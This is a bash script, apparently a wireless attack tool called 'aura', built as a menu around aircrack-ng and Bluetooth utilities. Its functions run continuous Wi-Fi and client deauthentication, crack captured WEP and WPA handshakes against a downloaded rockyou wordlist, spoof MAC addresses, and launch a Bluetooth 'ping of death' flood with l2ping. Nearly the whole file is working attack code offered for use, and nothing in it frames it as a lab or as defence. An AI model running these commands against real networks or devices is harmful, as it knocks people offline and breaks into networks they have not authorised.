f_toolscheck()
{
    
info="REQUIES TOOL NOT FOUND! INSTALL IT USING INSTALL.SH..."
    
    command -v aircrack-ng >/dev/null 2>&1 || { printf >&2 "\e[0m$info\n "; exit; }
    command -v macchanger >/dev/null 2>&1 || { printf >&2 "\e[0m$info\n "; exit; }
    command -v speedtest-cli >/dev/null 2>&1 || { printf >&2 "\e[0m$info\n "; exit; }
    command -v figlet >/dev/null 2>&1 || { printf >&2 "\e[0m$info\n "; exit; }
    
}

banner()
{
    f_toolscheck
    clear
printf '
 \e[91m8888b.  888  888 888d888 8888b.      
    \e[38;5;208m"88b 888  888 888P"      "88b 
\e[93m.d888888 888  888 888    .d888888  
\e[92m888  888 Y88b 888 888    888  888 
\e[94m"Y888888  "Y88888 888    "Y888888 \e[0mv0.4\n'
}

auramenu()
{
    banner
    printf "\e[0m
--------------------------" | lolcat -F 3
printf "
(1) DEAUTH WI-FI/CLIENT
(2) SCAN FOR WI-FI/CLIENT
(3) MONITOR MODE MENU
(4) CHANGE MAC ADDRES
(5) SHOW WIRELESS IFACES
(6) CRACK CAPTURE\n"
printf "\e[0m--------------------------" | lolcat -F 3

printf "
(7) BLUETOOTH POD
(8) BLUETOOTH SCAN
"
printf "\e[0m--------------------------" | lolcat -F 3
printf "
(9) SETTINGS
"
printf "\e[0m--------------------------" | lolcat -F 3
printf "
(10) EXIT\n
" 

read -p "SELECT: " auramenu
case $auramenu in
    
    1) aurajammer ;;
    
    2) aurascanner ;;
    
    3) mmmode ;;
    
    4) mac ;;
    
    5) ifaces;;
    
    6) crackcap ;;
    
    7) bt_pod ;;
    
    8) bt_scan ;;
    
    9) settings ;;
    
    10) exit ; clear ;;
    
    *) printf "\e[93mINCORRECT OPTION...\n"; exit;;
    esac
}

#####################################################################

aurajammer()
{
    banner
    printf "\n\e[0m--------------------------" | lolcat -F 3
    printf "\e[0m
(1) DEAUTH WI-FI 
(2) DEAUTH CLIENT\n"
    printf "\e[0m--------------------------" | lolcat -F 3
printf "
(3) BACK\n
"
read -p "SELECT: " deauth
case $deauth in
    
    1) f_wifi ;;
    
    2) f_client ;;
    
    3) auramenu ;;
    
    *) printf "\e[93mINCORRECT OPTION...\n"; exit;;
    esac
}

f_wifi()
{
    banner
    printf "\e[0m\n"
    read -p "WI-FI BSSID: " BSSID
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "DEAUTH $BSSID? (Y/N): " yesorno
    printf "\e[93m\n"
    case $yesorno in
        [yY][eE][sS]|[yY])
            printf "STARTING ATTACK...\n"
            sleep 1
            aireplay-ng -0 0 -a $BSSID $iface --ignore-negative-one
            ;;
        [nN][oO]|[nN])
            printf "BACKING TO MENU..."
            sleep 1.2
            auramenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        exit
        ;;
    esac
}

f_client()
{
  banner
    printf "\e[0m\n"
    read -p "WI-FI BSSID: " BSSID
    read -p "CLIENT BSSID: " CLIENT
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "DEAUTH $BSSID? (Y/N): " yesorno
    printf "\e[93m\n"
    case $yesorno in
        [yY][eE][sS]|[yY])
            printf "STARTING ATTACK...\n"
            sleep 1
            aireplay-ng -0 0 -b $BSSID -c $CLIENT $iface --ignore-negative-one
            ;;
        [nN][oO]|[nN])
            printf "BACKING TO MENU..."
            sleep 1.2
            auramenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        exit
        ;;
    esac
}

####################################################################

aurascanner()
{
    banner
    printf "\n\e[0m--------------------------" | lolcat -F 3
    printf "\e[0m
(1) SCAN FOR WI-FI
(2) SCAN FOR CLIENTS\n"
    printf "\e[0m--------------------------" | lolcat -F 3
    printf "
(3) BACK\n
"
read -p "SELECT: " select
    case $select in
    
    1) f_apscan ;;
    
    2) f_cliscan ;;
    
    3) auramenu ;;
    
    *) printf "\e[93mINCORRECT OPTION...\n"; exit;;
    esac
}

f_apscan()
{
    banner
    printf "\e[0m\n"
    read -r -p "SAVE LOGS? (Y/N): " logs
    case $logs in
        [yY][eE][sS]|[yY])
            read -p "CAPTURE NAME: " cap
            read -p "INTERFACE: " iface
            printf "\e[93m\n"
            read -r -p "START SCAN? (Y/N): " yesorno
            case $yesorno in
                [yY][eE][sS]|[yY])
                    printf "\e[93m"
                    printf "STARTING SCAN...\e[0m\n"
                    sleep 1
                    airodump-ng -w $cap --output-format csv $iface
                    ;;
                [nN][oO]|[nN])
                    printf "\e[93m\nBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "\e[93mINCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        [nN][oO]|[nN])
            read -p "INTERFACE: " iface
            printf "\e[93m\n"
            read -r -p "START SCAN? (Y/N): " yesorno
            case $yesorno in
                [yY][eE][sS]|[yY])
                    printf "\e[93m"
                    printf "STARTING SCAN...\e[0m\n"
                    airodump-ng $iface
                    ;;
                [nN][oO]|[nN])
                    printf "\e[93m\nBACKING TO MENU..."     
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "\e[93mINCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        exit
        ;;
    esac
}

f_cliscan()
{
    banner
    printf "\e[0m\n"
    read -r -p "SAVE LOGS? (Y/N): " logs
    case $logs in
        [yY][eE][sS]|[yY])
            read -p "CAPTURE NAME: " cap
            read -p "WI-FI BSSID: " bssid
            read -p "INTERFACE: " iface
            printf "\e[93m\n"
            read -r -p "START SCAN? (Y/N): " yesorno
            case $yesorno in
                [yY][eE][sS]|[yY])
                    printf "\e[93m"
                    printf "STARTING SCAN...\e[0m\n"
                    sleep 1
                    airodump-ng --bssid $bssid -w $cap --output-format csv $iface
                    ;;
                [nN][oO]|[nN])
                    printf "\e[93m\nBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        [nN][oO]|[nN])
            read -p "WI-FI BSSID: " bssid
            read -p "INTERFACE: " iface
            printf "\e[93m\n"
            read -r -p "START SCAN? (Y/N): " yesorno
            case $yesorno in
                [yY][eE][sS]|[yY])
                    printf "\e[93m"
                    printf "STARTING SCAN...\e[0m\n"
                    sleep 1
                    airodump-ng --bssid $bssid $iface
                    ;;
                [nN][oO]|[nN])
                    printf "\e[93m\nBACKING TO MENU..."     
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        *)
        printf "INCORRECT OPTION...\n"
        exit
        ;;
    esac
}

####################################################################

mmmode()
{
    banner
    printf "\n\e[0m--------------------------" | lolcat -F 3
    printf "\e[0m
(1) ENABLE MONITOR MODE
(2) DISABLE MONITOR MODE\n"
printf "\e[0m--------------------------" | lolcat -F 3
printf "
(3) BACK\n
"
read -p "SELECT: " select
    case $select in
    
    1) mmode ;;
    
    2) mmodeoff ;;
    
    3) auramenu ;;
    
    *) printf "\e[93mINCORRECT OPTION...\n"; exit;;
    esac
}





mmode()
{
    banner
    printf "\e[0m\n"
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "YOU WANT TO CHOOSE A CHANNEL? (Y/N): " quest
    case $quest in 
        [yY][eE][sS]|[yY])
            printf "\e[0m\n"
            read -p "CHANNEL: " chnl
            printf "\e[93m\n"
            read -r -p "ENABLE MONITOR MODE ON $iface? (Y/N): " t
            case $t in
                [yY][eE][sS]|[yY])
                    printf "\nENABLING MONITOR MODE..."
                    sleep 1
                    printf "\e[0m"
                    airmon-ng check kill
                    airmon-ng start $iface $chnl
                    sleep 1.5
                    printf "\e[0m"
                    printf "\nBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                [nN][oO]|[nN])
                    printf "\nBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        [nN][oO]|[nN])
            printf "\e[93m\n"
            read -r -p "ENABLE MONITOR MODE ON $iface? (Y/N): " t
            case $t in
                [yY][eE][sS]|[yY])
                    printf "\nENABLING MONITOR MODE..."
                    printf "\e[0m"
                    sleep 1
                    airmon-ng check kill
                    airmon-ng start $iface 
                    sleep 1.5
                    printf "\e[93m"
                    printf "\nBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                [nN][oO]|[nN])
                    printf "\nBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        *)
        printf "INCORRECT OPTION...\n"
        exit
        ;;
    esac
        
}

mmodeoff()
{
    banner
    printf "\e[0m\n"
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "START NETWORK-MANAGER SERVICE AFTER DISABLING MONITOR MODE? (Y/N): " networkm
    printf "\n"
    case $networkm in
        [yY][eE][sS]|[yY])
            read -r -p "DISABLE MONITOR MODE ON $iface? (Y/N): " yesorno
            printf "\e[93m\n"
            case $yesorno in
                [yY][eE][sS]|[yY])
                printf "DISABLING MONITOR MODE...\n"
                sleep 1
                printf "\e[0m"
                airmon-ng check kill
                airmon-ng stop $iface
                printf "\e[93m\n"
                printf "STARTING NETWORK-MANAGER SERVICE...\n\e[0m"
                sleep 1.2
                service network-manager start
                printf "\n\e[93mBACKING TO MENU..."
                sleep 1.2
                auramenu
                ;;
                [nN][oO]|[nN])
                printf "BACKING TO MENU..."
                sleep 1.2
                auramenu
                ;;
                *)
                printf "\e[93mINCORRECT OPTION...\n"
                exit
                ;;
            esac
        ;;
        [nN][oO]|[nN])
           read -r -p "DISABLE MONITOR MODE ON $iface? (Y/N): "                yesorno
            printf "\e[93m\n"
            case $yesorno in
                [yY][eE][sS]|[yY])
                printf "DISABLING MONITOR MODE...\n"
                sleep 1
                printf "\e[0m"
                airmon-ng check kill
                airmon-ng stop $iface
                printf "\e[93mBACKING TO MENU..."
                sleep 1.2
                auramenu
                ;;
                [nN][oO]|[nN])
                printf "BACKING TO MENU..."
                sleep 1.2
                auramenu
                ;;
                *)
                printf "\e[93mINCORRECT OPTION...\n"
                exit
                ;;
            esac
        ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        exit
        ;;
    esac
}

####################################################################

mac()
{
    banner
    printf "\n\e[0m--------------------------" | lolcat -F 3
    printf "\e[0m
(1) SET CUSTOM MAC ADDRES
(2) SET RANDOM MAC ADDRES
(3) RESET MAC ADDRES\n"
printf "\e[0m--------------------------" | lolcat -F 3
printf "
(4) BACK\n
"
read -p "SELECT: " select
case $select in

1) mac1 ;;

2) mac2;;

3) mac3;;

4) auramenu;;

*) printf "\e[93mINCORRECT OPTION...\n"; exit;;
esac
}

mac1()
{
    banner
    printf "\e[0m\n"
    read -p "MAC ADDRES: " MAC
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "CHANGE MAC ADDRES ON $iface? (Y/N): " questyorn
    printf "\n"
    case $questyorn in
        [yY][eE][sS]|[yY])
            printf "\e[0m"
            ifconfig $iface down
            macchanger -m $MAC $iface
            ifconfig $iface up
            printf "\n\e[93m"
            read -p "DONE! PRESS [ENTER] TO BACK..." variable
            auramenu
            ;;
        [nN][oO]|[nN])
            printf "\e[93mBACKING TO MENU..."
            sleep 1.2
            auramenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        ;;
    esac
}
    
mac2()
{
    banner
    printf "\e[0m\n"
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "CHANGE MAC ADDRES ON $iface? (Y/N): " questyorn
    printf "\n"
    case $questyorn in
        [yY][eE][sS]|[yY])
            printf "\e[0m"
            ifconfig $iface down
            macchanger -a $iface
            ifconfig $iface up
            printf "\n\e[93m"
            read -p "DONE! PRESS [ENTER] TO BACK..." variable
            auramenu
            ;;
        [nN][oO]|[nN])
            printf "\e[93mBACKING TO MENU..."
            sleep 1.2
            auramenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        ;;
    esac
}

mac3()
{
    banner
    printf "\e[0m\n"
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "RESET MAC ADDRES ON $iface? (Y/N): " questyorn
    printf "\n"
    case $questyorn in
        [yY][eE][sS]|[yY])
            printf "\e[0m"
            ifconfig $iface down
            macchanger -p $iface
            ifconfig $iface up
            printf "\n\e[93m"
            read -p"DONE! PRESS [ENTER] TO BACK..." variable
            auramenu
            ;;
        [nN][oO]|[nN])
            printf "\e[93mBACKING TO MENU..." 
            sleep 1.2
            auramenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        ;;
    esac
}

ispeed()
{
    banner
    printf "\e[0m\n"
    speedtest-cli
    printf "\e[93m\n"
    read -p "PRESS [ENTER] TO BACK..." variable
    auramenu
}

ifaces()
{
    banner
    printf "\e[0m\n"
    printf "\e[93m----------------------------\n||\e[96mIP ADDRES:\e[92m $(curl -s ifconfig.me)\e[93m||\n----------------------------\n"
    printf "\e[93mLIST OF AVAILABLE INTERFACES:\e[0m\n"
    printf "\n"
    ip -o link | grep ether | awk '{ print $2" "$17 }'
    printf "\n\e[93m"
    read -p "PRESS [ENTER] TO BACK..." variable
    auramenu
    
    
}

rootcheck()
{
if [[ $EUID -ne 0 ]]; then
   echo "THIS SCRIPT MUST BE RUN AS ROOT! ABORTING..." 
   exit 1
fi
}

settings()
{
    banner
    printf "\n\e[0m--------------------------" | lolcat -F 3
    printf "\e[0m
(1) CHECK INTERNET SPEED
(2) THE CLEANER
(3) UPDATE SCRIPT\n"
printf "\e[0m--------------------------" | lolcat -F 3
printf "
(4) BACK\n
"
read -p "SELECT: " set
case $set in

1) ispeed;;
2) cleanram;;
3) f_update;;
4) auramenu;;
*) printf "\e[93mINCORRECT OPTION...\n"; exit;;
esac

}

cleanram()
{
banner
printf "\e[0m\n\e[93mTHE CLEANER\e[92m\n*DELETE ALL LOGS SAVED IN AURA FOLDER\n*CLEAR YOU RAM MEMORY\n*CLEAR SWAP MEMORY"
printf "\e[93m\n"
read -r -p "RUN CLEANER? (Y/N): " questyorn
printf "\n"
case $questyorn in
    [yY][eE][sS]|[yY])
            printf "CLEANING..."
            printf "\e[0m\n"
            sync; echo 3 > /proc/sys/vm/drop_caches 
            rm -f *.csv 
            swapoff -a && swapon -a
            printf "\n\e[93m"
            read -p"DONE! PRESS [ENTER] TO BACK..." variable
            auramenu
            ;;
    [nN][oO]|[nN])
            printf "\e[93mBACKING TO MENU..." 
            sleep 1.2
            auramenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n";exit
        ;;
esac
}

f_update()
{
    
banner
printf "\n\e[93m"
read -r -p "UPDATE SCRIPT? (Y/N): " questyorn
    printf "\n"
    case $questyorn in
        [yY][eE][sS]|[yY])
            printf "\e[0m"
            banner
            printf "\n\e[93mUPDATING...\e[0m\n\n"
            sleep 1
            rm aura.sh
            wget https://raw.githubusercontent.com/rkhunt3r/aura/master/aura.sh
            chmod +x aura.sh
            printf "\n\e[93m"
            read -p "DONE! PRESS [ENTER]..." variable
            bash aura.sh
            ;;
        [nN][oO]|[nN])
            printf "\e[93mBACKING TO MENU..."
            sleep 1.2
            auramenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        exit
        ;;
    esac
}

crackcap()
{
    
if [ -e rockyou.txt ]
then
    crackmenu
else
    crackap2
fi
    
}

crackmenu()
{
    banner
    printf "\n\e[0m--------------------------" | lolcat -F 3
    printf "\e[0m
(1) CRACK WEP CAPTURE
(2) CRACK WPA/WPA2 CAPTURE\n"
printf "\e[0m--------------------------" | lolcat -F 3
printf "
(3) BACK

"
read -p "SELECT: " sel
case $sel in
1) wep_crack ;;
2) wpa_crack ;;
3) auramenu ;;
*) printf "\e[93mINCORRECT OPTION...\n";exit ;;
esac
}


wep_crack()
{
    
    banner
    printf "\e[0m\n"
    read -p "TARGET CAPTURE BSSID: " bssid
    read -p "CAPTURE FILE (.cap): " capture
    printf "\e[93m\n"
    read -p "USE CUSTOM WORDLIST OR ROCKYOU WORDLIST? (c/r): " quest
    case $quest in
        [cC][uU][sS][tT][oO][mM]|[cC])
            printf "\e[0m"
            read -p "WORDLIST (.txt): " wordlist
            printf "\e[93m\n"
            read -p "CRACK $capture? (y/n): " capturequest
            case $capturequest in
                [yY][eE][sS]|[yY])
                    printf "\nCRACKING...\n\e[0m"
                    sleep 1
                    aircrack-ng -a1 -b $bssid -w $wordlist $capture
                    printf "\n\e[93m"
                    read -p "DONE! PRESS [ENTER] TO BACK..." variable
                    auramenu
                    ;;
                [nN][oO]|[nN])
                    printf "\e[93mBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "\e[93mINCORRECT OPTION...\n";exit
                ;;
            esac
            ;;
        [rR][oO][cC][kK][yY][oO][uU]|[rR])
                if [ -e rockyou.txt ]
                then 
                    check1
                else 
                    crackap2
                fi
                ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n";exit
        ;;
    esac
    
}



wpa_crack()
{
    
    banner
    printf "\e[0m\n"
    read -p "TARGET CAPTURE BSSID: " bssid
    read -p "CAPTURE FILE (.cap): " capture
    printf "\e[93m\n"
    read -p "USE CUSTOM WORDLIST OR ROCKYOU WORDLIST? (c/r): " quest
    case $quest in
        [cC][uU][sS][tT][oO][mM]|[cC])
            printf "\e[0m"
            read -p "WORDLIST (.txt): " wordlist
            printf "\e[93m\n"
            read -p "CRACK $capture? (y/n): " capturequest
            case $capturequest in
                [yY][eE][sS]|[yY])
                    printf "\nCRACKING...\n\e[0m"
                    sleep 1
                    aircrack-ng -a2 -b $bssid -w $wordlist $capture
                    printf "\n\e[93m"
                    read -p "DONE! PRESS [ENTER] TO BACK..." variable
                    auramenu
                    ;;
                [nN][oO]|[nN])
                    printf "\e[93mBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "\e[93mINCORRECT OPTION...\n";exit
                ;;
            esac
            ;;
        [rR][oO][cC][kK][yY][oO][uU]|[rR])
            if [ -e rockyou.txt ]
            then
                check2
            else
                crackap2
            fi
            ;;
        *) printf "\e[93mINCORRECT OPTION...\n";exit
        ;;
    esac
}

crackap2()
{
    banner
    printf "\e[0m"
    printf "\n\e[93mROCKYOU.TXT NOT FOUND IN AURA FOLDER!\nYOU CAN CONTINUE WITHOUT IT\n\e[0m"
    read -p "DOWNLOAD ROCKYOU WORLDLIST (134MB) (y/n): " download
    case $download in
        [yY][eE][sS]|[yY])
            printf "\n\e[93mDOWNLOADING... THIS CAN TAKE A WHILE.\e[0m\n"
            sleep 1
            curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
            printf "\e[93m\nDONE!\e[0m"
            sleep 1.2
            crackmenu
            ;;
        [nN][oO]|[nN])
            crackmenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n";exit
        ;;
    esac
}


check1()
{
            printf "\e[93m\n"
            read -p "CRACK $capture? (y/n): " capturequest
            case $capturequest in
                [yY][eE][sS]|[yY])
                    printf "\nCRACKING...\n\e[0m"
                    sleep 1
                    aircrack-ng -a1 -b $bssid -w rockyou.txt $capture
                    printf "\n\e[93m"
                    read -p "DONE! PRESS [ENTER] TO BACK..." variable
                    auramenu
                    ;;
                [nN][oO]|[nN])
                    printf "\e[93mBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "\e[93mINCORRECT OPTION...\n";exit
                ;;
            esac
}

check2()
{
            printf "\e[93m\n"
            read -p "CRACK $capture? (y/n): " capturequest
            case $capturequest in
                [yY][eE][sS]|[yY])
                    printf "\nCRACKING...\n\e[0m"
                    sleep 1
                    aircrack-ng -a2 -b $bssid -w rockyou.txt $capture
                    printf "\n\e[93m"
                    read -p "DONE! PRESS [ENTER] TO BACK..." variable
                    auramenu
                    ;;
                [nN][oO]|[nN])
                    printf "\e[93mBACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "\e[93mINCORRECT OPTION...\n";exit
                ;;
            esac
}

bt_pod()
{
    banner
    printf "\e[0m\n"
    read -p "INTERFACE: " device
    read -p "TARGET: " target
    printf "\e[93mSTARTING BT PING OF DEATH ATTACK...\n"
    hciconfig $device up
    l2ping -i $device -s 5000 -f $target
    printf "DONE!\n"
    read -p "press [ENTER] to back" variable
    auramenu
}

bt_scan()
{
    banner
    printf "\e[0m\n"
    read -p "INTERFACE: " device
    read -p "SAVE LOGS? (y/n): " logs
    case $logs in
        [yY][eE][sS]|[yY])
            read -p "OUTPUT: " log
            printf "\n\e[93mSTARTING SCAN...\n"
            hciconfig $device up
            while [ 1 ]; do hcitool scan >> $log;printf "\n\e[93mDONE!\nRETRYING... HIT CTRL+C TO KILL\e[0m\n";done
            printf "\nDONE!\n"
            read -p "press [ENTER] to back" variable
            auramenu
            ;;
        [nN][oO]|[nN])
            printf "\n\e[93mSTARTING SCAN...\e[0m\n"
            hciconfig $device up
            while [ 1 ]; do hcitool scan;printf "\n\e[93mRETRYING... HIT CTRL+C TO KILL\e[0m\n";done
            printf "[*] Scan complete\n"
            read -p "press [ENTER] to back" variable
            auramenu
            ;;
        *) printf "\e[91m[*]\e[37mError 404: Select something bitch!"; sleep 1.5; f_btscan
        ;;
    esac
}

rootcheck
auramenu 
